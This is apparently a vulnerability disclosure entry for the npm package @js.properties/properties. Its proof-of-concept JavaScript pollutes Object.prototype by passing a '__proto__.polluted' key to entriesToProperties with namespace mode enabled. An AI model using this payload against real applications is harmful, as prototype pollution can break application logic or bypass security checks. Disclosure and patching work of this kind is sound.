# @js.properties/properties

- package name: `@js.properties/properties`

- PoC exploit:

```javascript
var properties = require('@js.properties/properties');

properties.entriesToProperties([{key: '__proto__.polluted', element: 'yes'}], {namespace: true});
// Object.prototype.polluted === 'yes'
```